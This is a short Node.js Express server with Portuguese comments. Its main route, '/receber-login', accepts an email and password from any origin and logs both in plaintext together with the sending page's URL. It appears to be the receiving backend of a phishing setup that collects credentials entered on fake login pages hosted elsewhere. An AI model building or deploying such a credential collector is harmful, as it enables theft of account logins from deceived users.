const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

// A Railway define a porta automaticamente
const PORT = process.env.PORT || 3000;

// Configurações
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota de saúde (health check)
app.get('/health', (req, res) => {
    res.json({ status: 'OK', message: 'Servidor funcionando!' });
});

// Rota para receber logins
app.post('/receber-login', (req, res) => {
    const { email, senha } = req.body;
    const data = new Date().toLocaleString('pt-BR');
    
    console.log('📨 NOVO LOGIN RECEBIDO:');
    console.log('👤 Email:', email);
    console.log('🔑 Senha:', senha);
    console.log('⏰ Data/Hora:', data);
    console.log('🌐 URL:', req.get('origin'));
    console.log('──────────────────────────');
    
    res.json({ 
        success: true, 
        message: 'Login recebido com sucesso!',
        data: data,
        recebido: true
    });
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📧 Sistema de login pronto!`);
});